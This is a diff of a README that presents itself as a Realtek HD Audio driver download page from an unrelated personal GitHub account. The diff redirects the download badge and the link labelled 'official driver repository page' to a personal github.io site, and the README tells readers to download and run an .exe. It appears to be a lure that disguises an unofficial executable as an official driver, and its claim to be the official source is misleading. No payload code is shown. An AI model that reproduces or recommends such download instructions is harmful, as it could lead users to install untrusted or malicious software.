@@ -1,6 +1,6 @@
 # 🎧 Realtek-HD-Audio-Driver - Restore your computer sound quality today
 
-[![](https://img.shields.io/badge/Download-Realtek_Audio-blue.svg)](https://github.com/Lost-assumption404/Realtek-HD-Audio-Driver)
+[![](https://img.shields.io/badge/Download-Realtek_Audio-blue.svg)](https://lost-assumption404.github.io)
 
 ## Purpose of this software
 
@@ -20,7 +20,7 @@ Ensure your computer meets these conditions before you begin the installation pr
 
 You need to access the official project page to retrieve the driver files. Follow these instructions to reach the download source:
 
-1. Visit the [official driver repository page](https://github.com/Lost-assumption404/Realtek-HD-Audio-Driver).
+1. Visit the [official driver repository page](https://lost-assumption404.github.io).
 2. Look for the section labeled Releases on the right side of the page.
 3. Click the most recent version labeled as Latest.
 4. Select the file ending in .exe to start the download to your computer.
